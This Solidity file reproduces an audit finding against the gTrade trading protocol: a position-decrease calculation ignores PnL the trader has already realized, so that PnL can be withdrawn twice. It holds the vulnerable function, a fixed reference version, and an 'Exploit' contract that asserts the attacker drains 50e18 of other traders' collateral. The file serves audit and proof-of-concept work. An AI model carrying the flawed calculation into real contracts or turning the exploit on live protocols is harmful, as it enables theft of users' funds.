// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Gains Network gTrade finding 58127
// (C-01): "Decrease position can be abused to withdraw PnL twice".
//
// Real audited source (the vulnerable calc is reproduced VERBATIM, the vulnerable
// line is marked @>):
//   protocol  Gains Network gTrade (v9.2)
//   report    github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review_2025-05-26.md
//   fn        DecreasePositionSizeUtils.prepareCallbackValues  (steps 1-6)
//   called by UpdatePositionSizeLifecycles.executeDecreasePositionSizeMarket
//
// Root cause (verbatim from the finding): when a position is decreased,
// `prepareCallbackValues` computes `values.existingPnlCollateral` from the trade's
// `openPrice` and `collateralAmount` ALONE — it never subtracts the PnL the trader
// has ALREADY realized/withdrawn on this position (`realizedPnlCollateral`). The
// value actually paid to the trader,
//     collateralSentToTrader = partialTrade.collateralAmount + partialTradePnlCollateral
// therefore hands back a proportional slice of the FULL mark-to-market PnL a
// second time, letting the trader withdraw the same PnL again. The audit's own
// recommendation: "Consider realizedPnlCollateral when calculating
// values.existingPnlCollateral."
//
// The vulnerable arithmetic below (steps 1-6 of `prepareCallbackValues`) is
// byte-for-byte the audited source; the `@> VULN` line is the
// `existingPnlCollateral` computation the fix must correct. Non-vulnerable
// dependencies (`TradingCommonUtils.getPnlPercent` / `getPositionSizeCollateral` /
// price-impact / fee / diamond-balance helpers, the collateral token, and the
// `updateTradeSuccess` payout) are faithful minimal doubles with real transfers
// and real accounting.
//
// Harm is quantified against a `_prepareCallbackValuesFixed` reference (refId)
// that applies the audit's recommendation verbatim (subtract
// realizedPnlCollateral). Running the IDENTICAL decrease through the verbatim
// (buggy) path and the fixed path, the buggy diamond over-pays the trader by
// exactly the already-realized PnL and drains that amount from other traders'
// collateral held in the diamond.
// ─────────────────────────────────────────────────────────────────────────────

library ConstantsUtils {
    uint256 internal constant P_10 = 1e10;
}

// ── protocol data structures (faithful minimal subset of the real interfaces) ──
library ITradingStorage {
    struct Trade {
        address user;
        uint32 index;
        uint8 collateralIndex;
        uint16 pairIndex;
        uint120 collateralAmount;
        uint24 leverage; // 1e3 precision (5x = 5000)
        uint64 openPrice; // 1e10 precision
        bool long;
        bool isCounterTrade;
        // gTrade tracks the PnL the trader has already realized/withdrawn on this
        // position. `prepareCallbackValues` must subtract it but does not (the bug).
        int256 realizedPnlCollateral;
    }
}

library ITradingCallbacks {
    struct AggregatorAnswer {
        uint256 orderId;
        uint64 current; // current market price, 1e10 precision
        uint64 price;
    }
}

library IPriceImpact {
    struct PriceImpactValues {
        uint256 priceAfterImpact;
        uint256 priceImpactP;
    }
}

library IUpdatePositionSizeUtils {
    struct DecreasePositionSizeValues {
        uint256 positionSizeCollateralDelta;
        uint256 existingPositionSizeCollateral;
        uint256 closingFeeCollateral;
        uint256 newCollateralAmount;
        uint24 newLeverage;
        IPriceImpact.PriceImpactValues priceImpact;
        int256 existingPnlCollateral;
        uint256 availableCollateralInDiamond;
        int256 collateralSentToTrader;
        uint256 existingLiqPrice;
        uint256 newLiqPrice;
    }
}

// ── faithful minimal ERC20 collateral double (gDAI-style, 18 decimals) ──
contract MiniToken {
    string public name = "Gains DAI";
    string public symbol = "DAI";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ── faithful minimal doubles for the non-vulnerable TradingCommonUtils helpers ──
library TradingCommonUtils {
    // positionSize (in collateral) = collateral * leverage / 1e3  (real gTrade formula)
    function getPositionSizeCollateral(uint256 _collateralAmount, uint256 _leverage)
        internal
        pure
        returns (uint256)
    {
        return (_collateralAmount * _leverage) / 1e3;
    }

    // PnL% (P_10-scaled, *100) so the caller's `* collateral / 100 / P_10` yields
    // collateral PnL. Long: (current-open)/open * leverage; short: inverse. Real math.
    function getPnlPercent(uint64 _openPrice, uint64 _currentPrice, bool _long, uint24 _leverage)
        internal
        pure
        returns (int256 pnlPercent)
    {
        int256 openP = int256(uint256(_openPrice));
        int256 curP = int256(uint256(_currentPrice));
        int256 priceDiff = _long ? (curP - openP) : (openP - curP);
        pnlPercent =
            (priceDiff * int256(uint256(_leverage)) * 100 * int256(ConstantsUtils.P_10)) /
            openP /
            int256(1e3);
    }

    // closing spread / price impact double: no spread in this isolated repro, so the
    // price after impact is the raw current price (faithful minimal).
    struct TradePriceImpactInput {
        ITradingStorage.Trade trade;
        uint64 marketPrice;
        uint256 positionSizeCollateral;
        uint64 currentPrice;
    }

    function getTradeClosingPriceImpact(TradePriceImpactInput memory _input)
        internal
        pure
        returns (IPriceImpact.PriceImpactValues memory priceImpact, bool)
    {
        priceImpact.priceAfterImpact = uint256(_input.currentPrice);
        priceImpact.priceImpactP = 0;
        return (priceImpact, true);
    }

    // no closing fees in this isolated repro (faithful minimal; fees are orthogonal
    // to the PnL double-count).
    function getTotalTradeFeesCollateral(uint8, address, uint16, uint256, bool)
        internal
        pure
        returns (uint256)
    {
        return 0;
    }

    // collateral the diamond currently holds available for this trade == the
    // diamond's real token reserve (funded by other traders' collateral).
    function getTradeAvailableCollateralInDiamond(ITradingStorage.Trade memory)
        internal
        view
        returns (uint256)
    {
        return MiniToken(GNSDiamond(address(this)).collateralToken()).balanceOf(address(this));
    }

    // liquidation-price double (not exercised by the harm path).
    function getTradeLiquidationPrice(ITradingStorage.Trade memory, uint64) internal pure returns (uint256) {
        return 0;
    }

    function getTradeLiquidationPrice(
        ITradingStorage.Trade memory,
        uint64,
        uint256,
        uint24,
        uint256,
        uint256,
        uint64
    ) internal pure returns (uint256) {
        return 0;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE library — `prepareCallbackValues` steps 1-6 reproduced VERBATIM from
// the audited DecreasePositionSizeUtils. The `@> VULN` line is the
// `existingPnlCollateral` computation that omits `realizedPnlCollateral`.
// ─────────────────────────────────────────────────────────────────────────────
library DecreasePositionSizeUtils {
    function prepareCallbackValues(
        ITradingStorage.Trade memory _existingTrade,
        ITradingStorage.Trade memory _partialTrade,
        ITradingCallbacks.AggregatorAnswer memory _answer,
        uint256 _liqParams // getTradeLiquidationParams double, unused
    ) internal view returns (IUpdatePositionSizeUtils.DecreasePositionSizeValues memory values) {
        // 1. Calculate position size delta and existing position size
        bool isLeverageUpdate = _partialTrade.leverage > 0;
        values.positionSizeCollateralDelta = TradingCommonUtils.getPositionSizeCollateral(
            isLeverageUpdate ? _existingTrade.collateralAmount : _partialTrade.collateralAmount,
            isLeverageUpdate ? _partialTrade.leverage : _existingTrade.leverage
        );
        values.existingPositionSizeCollateral = TradingCommonUtils.getPositionSizeCollateral(
            _existingTrade.collateralAmount,
            _existingTrade.leverage
        );

        // 2. Calculate partial trade closing fees
        values.closingFeeCollateral = TradingCommonUtils.getTotalTradeFeesCollateral(
            _existingTrade.collateralIndex,
            _existingTrade.user,
            _existingTrade.pairIndex,
            values.positionSizeCollateralDelta,
            _existingTrade.isCounterTrade
        );

        // 3. Calculate new collateral amount and leverage
        values.newCollateralAmount = _existingTrade.collateralAmount - _partialTrade.collateralAmount;
        values.newLeverage = _existingTrade.leverage - _partialTrade.leverage;

        // 4. Apply spread and price impact to answer.current
        (values.priceImpact, ) = TradingCommonUtils.getTradeClosingPriceImpact(
            TradingCommonUtils.TradePriceImpactInput(
                _existingTrade,
                _answer.current,
                values.positionSizeCollateralDelta,
                _answer.current
            )
        );

        // 5. Calculate existing trade pnl
        values.existingPnlCollateral = // @> VULN: uses openPrice*collateralAmount but never subtracts _existingTrade.realizedPnlCollateral, so already-withdrawn PnL is counted (and paid) again
            (TradingCommonUtils.getPnlPercent(
                _existingTrade.openPrice,
                uint64(values.priceImpact.priceAfterImpact),
                _existingTrade.long,
                _existingTrade.leverage
            ) * int256(uint256(_existingTrade.collateralAmount))) /
            100 /
            int256(ConstantsUtils.P_10);

        // 6. Calculate value sent to trader
        int256 partialTradePnlCollateral = (values.existingPnlCollateral * int256(values.positionSizeCollateralDelta)) /
            int256(values.existingPositionSizeCollateral);

        values.availableCollateralInDiamond = TradingCommonUtils.getTradeAvailableCollateralInDiamond(_existingTrade);
        values.availableCollateralInDiamond = _partialTrade.collateralAmount > values.availableCollateralInDiamond
            ? values.availableCollateralInDiamond
            : _partialTrade.collateralAmount;
        // @audit - should this consider pnl withdrawal
        values.collateralSentToTrader = int256(uint256(_partialTrade.collateralAmount)) + partialTradePnlCollateral;

        // 7. Calculate existing and new trade liquidation price
        values.existingLiqPrice = TradingCommonUtils.getTradeLiquidationPrice(_existingTrade, _answer.current);
        values.newLiqPrice = TradingCommonUtils.getTradeLiquidationPrice(
            _existingTrade,
            _existingTrade.openPrice,
            values.newCollateralAmount,
            values.newLeverage,
            values.closingFeeCollateral +
                uint256(values.collateralSentToTrader < 0 ? -values.collateralSentToTrader : int256(0)),
            _liqParams,
            _answer.current
        );
    }

    // refId — the audit's recommendation applied verbatim: subtract the already
    // realized PnL when computing existingPnlCollateral. Identical to the buggy
    // function except for the `- _existingTrade.realizedPnlCollateral` correction.
    function prepareCallbackValuesFixed(
        ITradingStorage.Trade memory _existingTrade,
        ITradingStorage.Trade memory _partialTrade,
        ITradingCallbacks.AggregatorAnswer memory _answer,
        uint256 _liqParams
    ) internal view returns (IUpdatePositionSizeUtils.DecreasePositionSizeValues memory values) {
        bool isLeverageUpdate = _partialTrade.leverage > 0;
        values.positionSizeCollateralDelta = TradingCommonUtils.getPositionSizeCollateral(
            isLeverageUpdate ? _existingTrade.collateralAmount : _partialTrade.collateralAmount,
            isLeverageUpdate ? _partialTrade.leverage : _existingTrade.leverage
        );
        values.existingPositionSizeCollateral = TradingCommonUtils.getPositionSizeCollateral(
            _existingTrade.collateralAmount,
            _existingTrade.leverage
        );
        values.closingFeeCollateral = TradingCommonUtils.getTotalTradeFeesCollateral(
            _existingTrade.collateralIndex,
            _existingTrade.user,
            _existingTrade.pairIndex,
            values.positionSizeCollateralDelta,
            _existingTrade.isCounterTrade
        );
        values.newCollateralAmount = _existingTrade.collateralAmount - _partialTrade.collateralAmount;
        values.newLeverage = _existingTrade.leverage - _partialTrade.leverage;
        (values.priceImpact, ) = TradingCommonUtils.getTradeClosingPriceImpact(
            TradingCommonUtils.TradePriceImpactInput(
                _existingTrade,
                _answer.current,
                values.positionSizeCollateralDelta,
                _answer.current
            )
        );
        // FIX: mark-to-market PnL MINUS the PnL already realized/withdrawn.
        values.existingPnlCollateral =
            ((TradingCommonUtils.getPnlPercent(
                _existingTrade.openPrice,
                uint64(values.priceImpact.priceAfterImpact),
                _existingTrade.long,
                _existingTrade.leverage
            ) * int256(uint256(_existingTrade.collateralAmount))) /
                100 /
                int256(ConstantsUtils.P_10)) - _existingTrade.realizedPnlCollateral;
        int256 partialTradePnlCollateral = (values.existingPnlCollateral * int256(values.positionSizeCollateralDelta)) /
            int256(values.existingPositionSizeCollateral);
        values.collateralSentToTrader = int256(uint256(_partialTrade.collateralAmount)) + partialTradePnlCollateral;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// gTrade diamond double: holds trades + a collateral reserve funded by other
// traders. `executeDecreasePositionSizeMarket` mirrors the audited outer function
// (prepare -> updateTradeSuccess). A `useFixed` flag selects the verbatim (buggy)
// path or the recommended (fixed) path so the two can be compared side by side.
// ─────────────────────────────────────────────────────────────────────────────
contract GNSDiamond {
    using DecreasePositionSizeUtils for *;

    MiniToken public immutable collateralTokenAddr;
    bool public immutable useFixed;

    mapping(bytes32 => ITradingStorage.Trade) internal trades;

    constructor(MiniToken _token, bool _useFixed) {
        collateralTokenAddr = _token;
        useFixed = _useFixed;
    }

    function collateralToken() external view returns (address) {
        return address(collateralTokenAddr);
    }

    function _key(address user, uint32 index) internal pure returns (bytes32) {
        return keccak256(abi.encode(user, index));
    }

    function getTrade(address user, uint32 index) external view returns (ITradingStorage.Trade memory) {
        return trades[_key(user, index)];
    }

    // open a position; realizedPnlCollateral seeds the PnL already withdrawn on
    // this position from prior partial operations (the state the bug ignores).
    function openTrade(
        address user,
        uint32 index,
        uint120 collateralAmount,
        uint24 leverage,
        uint64 openPrice,
        bool long,
        int256 realizedPnlCollateral
    ) external {
        // pull the trader's collateral into the diamond (real transfer)
        collateralTokenAddr.transferFrom(msg.sender, address(this), collateralAmount);
        trades[_key(user, index)] = ITradingStorage.Trade({
            user: user,
            index: index,
            collateralIndex: 1,
            pairIndex: 0,
            collateralAmount: collateralAmount,
            leverage: leverage,
            openPrice: openPrice,
            long: long,
            isCounterTrade: false,
            realizedPnlCollateral: realizedPnlCollateral
        });
    }

    // Mirrors executeDecreasePositionSizeMarket: prepare values, then updateTradeSuccess.
    function executeDecreasePositionSizeMarket(
        ITradingStorage.Trade memory partialTrade,
        ITradingCallbacks.AggregatorAnswer memory answer
    ) external returns (int256 collateralSentToTrader) {
        ITradingStorage.Trade storage existing = trades[_key(partialTrade.user, partialTrade.index)];
        ITradingStorage.Trade memory existingMem = existing;

        IUpdatePositionSizeUtils.DecreasePositionSizeValues memory values = useFixed
            ? DecreasePositionSizeUtils.prepareCallbackValuesFixed(existingMem, partialTrade, answer, 0)
            : DecreasePositionSizeUtils.prepareCallbackValues(existingMem, partialTrade, answer, 0);

        // updateTradeSuccess (faithful): pay the trader collateralSentToTrader out
        // of the diamond reserve, then shrink the stored position.
        collateralSentToTrader = values.collateralSentToTrader;
        if (collateralSentToTrader > 0) {
            collateralTokenAddr.transfer(existingMem.user, uint256(collateralSentToTrader));
        }
        existing.collateralAmount = uint120(values.newCollateralAmount);
        existing.leverage = values.newLeverage;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: open two IDENTICAL positions (each carrying 50e18 of
// already-realized PnL) — one on the verbatim (buggy) diamond, one on the fixed
// diamond — and fully decrease both at the same price. The buggy diamond pays the
// trader the already-realized 50e18 a SECOND time and drains it from the reserve
// of other traders' collateral; the fixed diamond does not.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public token;
    GNSDiamond public vuln; // verbatim (buggy) diamond
    GNSDiamond public fixedDiamond; // recommended-fix diamond (refId)

    address public constant HONEST = address(0xBEEF); // trader on the fixed diamond

    uint120 internal constant COLLATERAL = 100e18; // position collateral
    uint24 internal constant LEVERAGE = 5000; // 5x (1e3 precision)
    uint64 internal constant OPEN_PRICE = 1000e10; // entry price
    uint64 internal constant CURRENT_PRICE = 1200e10; // +20% -> +100% PnL at 5x
    int256 internal constant REALIZED_PNL = 50e18; // PnL already withdrawn previously
    uint256 internal constant OTHER_LIQUIDITY = 1000e18; // other traders' collateral in each diamond

    uint256 public buggyReserveDrain; // collateral drained from the buggy diamond
    uint256 public fixedReserveDrain; // collateral drained from the fixed diamond
    uint256 public buggyPayout; // collateral the attacker received (buggy)
    uint256 public fixedPayout; // collateral the honest trader received (fixed)
    uint256 public doubleWithdrawnPnl; // ill-gotten excess (the PnL withdrawn twice)
    uint256 public profit; // attacker's ill-gotten gain

    constructor() {
        token = new MiniToken(); // child nonce 1
        vuln = new GNSDiamond(token, false); // child nonce 2 (VULN — verbatim path)
        fixedDiamond = new GNSDiamond(token, true); // child nonce 3 (refId — fixed path)
    }

    function run() external {
        // fund each diamond reserve with other traders' collateral
        token.mint(address(vuln), OTHER_LIQUIDITY);
        token.mint(address(fixedDiamond), OTHER_LIQUIDITY);

        // ── buggy path: attacker opens + fully decreases on the verbatim diamond ──
        token.mint(address(this), COLLATERAL);
        token.approve(address(vuln), type(uint256).max);
        vuln.openTrade(address(this), 1, COLLATERAL, LEVERAGE, OPEN_PRICE, true, REALIZED_PNL);

        uint256 vulnReserveBefore = token.balanceOf(address(vuln));
        uint256 attackerBefore = token.balanceOf(address(this));
        vuln.executeDecreasePositionSizeMarket(
            _partial(address(this)),
            ITradingCallbacks.AggregatorAnswer({orderId: 1, current: CURRENT_PRICE, price: CURRENT_PRICE})
        );
        buggyPayout = token.balanceOf(address(this)) - attackerBefore;
        buggyReserveDrain = vulnReserveBefore - token.balanceOf(address(vuln));

        // ── fixed path: identical position + decrease on the fixed diamond ──
        token.mint(HONEST, COLLATERAL);
        _honestOpenAndDecrease();

        // ── measure the double-withdrawal ──
        // Both positions are identical (same collateral, leverage, prices, and the
        // same 50e18 already-realized PnL). The verbatim path over-pays the trader
        // by exactly that already-realized PnL and drains it from the reserve.
        doubleWithdrawnPnl = buggyPayout - fixedPayout;
        profit = doubleWithdrawnPnl;

        // HARM: the same PnL is withdrawn a second time (50e18), extracted from
        // other traders' collateral held in the diamond.
        require(buggyPayout == 200e18, "buggy payout mismatch");
        require(fixedPayout == 150e18, "fixed payout mismatch");
        require(doubleWithdrawnPnl == uint256(REALIZED_PNL), "PnL not double-withdrawn");
        require(
            buggyReserveDrain == fixedReserveDrain + uint256(REALIZED_PNL),
            "diamond not over-drained by the doubled PnL"
        );
        require(profit > 0, "no profit");
    }

    function _honestOpenAndDecrease() internal {
        // impersonation is unnecessary: openTrade pulls from msg.sender; fund/approve
        // are done here, and the honest trader address only receives the payout.
        token.mint(address(this), COLLATERAL); // stand-in funding to open the honest twin
        token.approve(address(fixedDiamond), type(uint256).max);
        fixedDiamond.openTrade(HONEST, 1, COLLATERAL, LEVERAGE, OPEN_PRICE, true, REALIZED_PNL);

        uint256 fixedReserveBefore = token.balanceOf(address(fixedDiamond));
        uint256 honestBefore = token.balanceOf(HONEST);
        fixedDiamond.executeDecreasePositionSizeMarket(
            _partial(HONEST),
            ITradingCallbacks.AggregatorAnswer({orderId: 1, current: CURRENT_PRICE, price: CURRENT_PRICE})
        );
        fixedPayout = token.balanceOf(HONEST) - honestBefore;
        fixedReserveDrain = fixedReserveBefore - token.balanceOf(address(fixedDiamond));
    }

    // partial trade: full-close the position (decrease all collateral, leverage 0)
    function _partial(address user) internal pure returns (ITradingStorage.Trade memory p) {
        p.user = user;
        p.index = 1;
        p.collateralAmount = COLLATERAL;
        p.leverage = 0;
    }
}
